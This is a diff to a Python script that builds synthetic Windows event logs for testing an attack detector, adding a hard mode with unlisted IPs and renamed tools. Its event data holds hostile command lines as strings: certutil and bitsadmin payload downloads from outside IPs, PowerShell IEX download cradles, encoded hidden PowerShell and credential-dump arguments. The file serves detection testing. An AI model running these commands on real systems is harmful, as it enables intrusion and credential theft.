@@ -64,6 +64,13 @@ EXTERNAL_ATTACK_IPS = [
     "203.0.113.66", "203.0.113.77", "198.51.100.66", "198.51.100.77",
     "192.0.2.44",
 ]
+#: ``--hard-mode`` uses IPs that are NOT in
+#: ``realworld_labeler.is_attack_ip_offline``'s hardcoded list, so the model
+#: cannot win by reading the threat-intel shortcut.
+HARD_EXTERNAL_IPS = [
+    "91.219.236.12", "185.220.101.44", "89.248.165.74", "193.32.162.9",
+    "94.102.49.190",
+]
 
 BENIGN_PROCESSES = [
     (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe"),
@@ -103,6 +110,25 @@ ATTACK_PROCESSES = [
      "nc.exe -e cmd.exe 203.0.113.77 4444", "cmd.exe", 0, 0, 1),
 ]
 
+#: ``--hard-mode`` renames the tooling so detection cannot rely on the
+#: hardcoded tool-name list in ``_is_attack_sample`` (mimikatz/procdump/nc/...).
+#: The behaviour (encoded PowerShell, Office-spawned interpreter, download
+#: cradle, writable-path binary, outbound session) is unchanged.
+ATTACK_PROCESSES_HARD = [
+    (r"C:\Users\Public\svcupdate.exe", "svcupdate.exe",
+     "svcupdate.exe -k lsass", "winword.exe", 0, 0, 1),
+    (r"C:\ProgramData\Intel\updater.exe", "updater.exe",
+     "updater.exe --dump --pid 644", "cmd.exe", 0, 1, 1),
+    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe",
+     "powershell.exe -nop -w hidden -enc SQBmACgAJABjAG0AZAAgAC0AZQBxACAAJAB0AHIAdQBlACkA", "winword.exe", 1, 0, 1),
+    (r"C:\Windows\System32\certutil.exe", "certutil.exe",
+     "certutil.exe -urlcache -split -f http://91.219.236.12/payload.bin C:\\Windows\\Temp\\p.bin", "cmd.exe", 0, 1, 0),
+    (r"C:\Windows\System32\bitsadmin.exe", "bitsadmin.exe",
+     "bitsadmin /transfer job /download /priority high http://89.248.165.74/x.exe C:\\ProgramData\\x.exe", "cmd.exe", 0, 1, 0),
+    (r"C:\ProgramData\Intel\winserv.exe", "winserv.exe",
+     "winserv.exe --connect 94.102.49.190:443", "cmd.exe", 0, 0, 1),
+]
+
 HIGH_RISK_EIDS = (4720, 4732, 7045, 4698, 4726)
 
 
@@ -128,8 +154,16 @@ def _rand_ts(rng: random.Random, day_start: datetime, start_h: int, end_h: int) 
     )
 
 
-def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
+def build_dataset(
+    days: int = 35, users: int = 20, seed: int = 1337, hard_mode: bool = False
+):
     """Return (events, attack_ids) where events are insert-ready dicts."""
+    # In hard mode the corpus avoids every indicator that the offline labeler
+    # hardcodes (TEST-NET IP ranges, well-known tool names).  Anything the
+    # model still catches has to come from behaviour, not threat-intel lookup.
+    attack_ips = HARD_EXTERNAL_IPS if hard_mode else EXTERNAL_ATTACK_IPS
+    attack_procs = ATTACK_PROCESSES_HARD if hard_mode else ATTACK_PROCESSES
+    scan_dir = r"C:\ProgramData\Intel" if hard_mode else r"C:\Windows\Temp"
     rng = random.Random(seed)
     now = datetime.now(UTC).replace(minute=0, second=0, microsecond=0)
     start = now - timedelta(days=days)
@@ -318,7 +352,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
     # Historical A: phishing -> macro -> encoded PowerShell (day 4)
     h1 = (start + timedelta(days=4)).replace(hour=10, minute=15, second=0, microsecond=0)
     hv = hist_users[0]
-    for offset, proc in enumerate((ATTACK_PROCESSES[2], ATTACK_PROCESSES[3])):
+    for offset, proc in enumerate((attack_procs[2], attack_procs[3])):
         image, name, cmd, parent, enc, dl, hid = proc
         add(
             h1 + timedelta(minutes=offset * 6), 4688, "Process", hv, user_hosts[hv],
@@ -335,7 +369,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
         h1 + timedelta(minutes=14), 4104, "Process", hv, user_hosts[hv],
         {
             "user": hv, "target_user": hv,
-            "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/b.ps1')",
+            "script_block": f"IEX (New-Object Net.WebClient).DownloadString('http://{attack_ips[4]}/b.ps1')",
             "script_len": 110, "cmdline_len": 0,
             "image_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "command_line": "", "parent_process": "winword.exe",
@@ -367,9 +401,9 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
         h2 + timedelta(minutes=10), 4688, "Process", hv2, user_hosts[hv2],
         {
             "user": hv2, "target_user": hv2,
-            "image_path": r"C:\Windows\Temp\nc.exe",
-            "new_process": r"C:\Windows\Temp\nc.exe",
-            "command_line": "nc.exe -zv 10.20.0.0 1-1024",
+            "image_path": rf"{scan_dir}\{attack_procs[5][1]}",
+            "new_process": rf"{scan_dir}\{attack_procs[5][1]}",
+            "command_line": f"{attack_procs[5][1]} -zv 10.20.0.0 1-1024",
             "parent_process": "cmd.exe",
             "cmdline_len": 24, "script_len": 0,
             "has_encoded": 0, "has_download": 0, "has_hidden": 1,
@@ -391,7 +425,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
 
     # Campaign 1: external password spray -> success (day 0)
     c1 = campaign_start(0, 2)
-    attacker_ip = EXTERNAL_ATTACK_IPS[0]
+    attacker_ip = attack_ips[0]
     for i, victim in enumerate(victims):
         for n in range(12):
             add(
@@ -439,7 +473,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
         "Explicit credential use for Administrator",
         1,
     )
-    image, name, cmd, parent, enc, dl, hid = ATTACK_PROCESSES[0]
+    image, name, cmd, parent, enc, dl, hid = attack_procs[0]
     add(
         c2 + timedelta(minutes=4), 4688, "Process", victim, "JUMP-01",
         {
@@ -455,7 +489,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
     # Campaign 3: execution + persistence (day 2)
     c3 = campaign_start(2, 4)
     victim = victims[1]
-    for proc in ATTACK_PROCESSES[2:5]:
+    for proc in attack_procs[2:5]:
         image, name, cmd, parent, enc, dl, hid = proc
         add(
             c3, 4688, "Process", victim, user_hosts[victim],
@@ -473,7 +507,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
         c3, 4104, "Process", victim, user_hosts[victim],
         {
             "user": victim, "target_user": victim,
-            "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')",
+            "script_block": f"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/a.ps1')",
             "script_len": 120, "cmdline_len": 0,
             "image_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "command_line": "", "parent_process": "cmd.exe",
@@ -537,7 +571,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
             5156, "Network", victim, user_hosts[victim],
             {
                 "user": victim,
-                "remote_ip": EXTERNAL_ATTACK_IPS[1],
+                "remote_ip": attack_ips[1],
                 "remote_port": 4444,
                 "protocol": "TCP",
                 "direction": "outbound",
@@ -557,7 +591,7 @@ def build_dataset(days: int = 35, users: int = 20, seed: int = 1337):
             4625, "Logon", victim, "-",
             {
                 "logon_type": 3,
-                "source_ip": EXTERNAL_ATTACK_IPS[2],
+                "source_ip": attack_ips[2],
                 "target_user": victim,
                 "sub_status": 0xC0000234,  # account locked out
                 "is_locked": 1,
@@ -664,11 +698,18 @@ def main() -> int:
         "--verdict-fraction", type=float, default=0.15,
         help="fraction of benign events analysts triaged as false positives",
     )
+    parser.add_argument(
+        "--hard-mode", action="store_true",
+        help="avoid indicators hardcoded in the offline labeler (TEST-NET IPs, "
+             "known tool names) so results cannot come from threat-intel lookup",
+    )
     args = parser.parse_args()
 
     events, attack_ids, holdout_start = build_dataset(
-        days=args.days, users=args.users, seed=args.seed
+        days=args.days, users=args.users, seed=args.seed, hard_mode=args.hard_mode
     )
+    if args.hard_mode:
+        print("Hard mode: no TEST-NET IPs, no well-known tool names.")
     counts = Counter(e["event_id"] for e in events)
 
     print(f"Generated {len(events):,} events over {args.days} days")
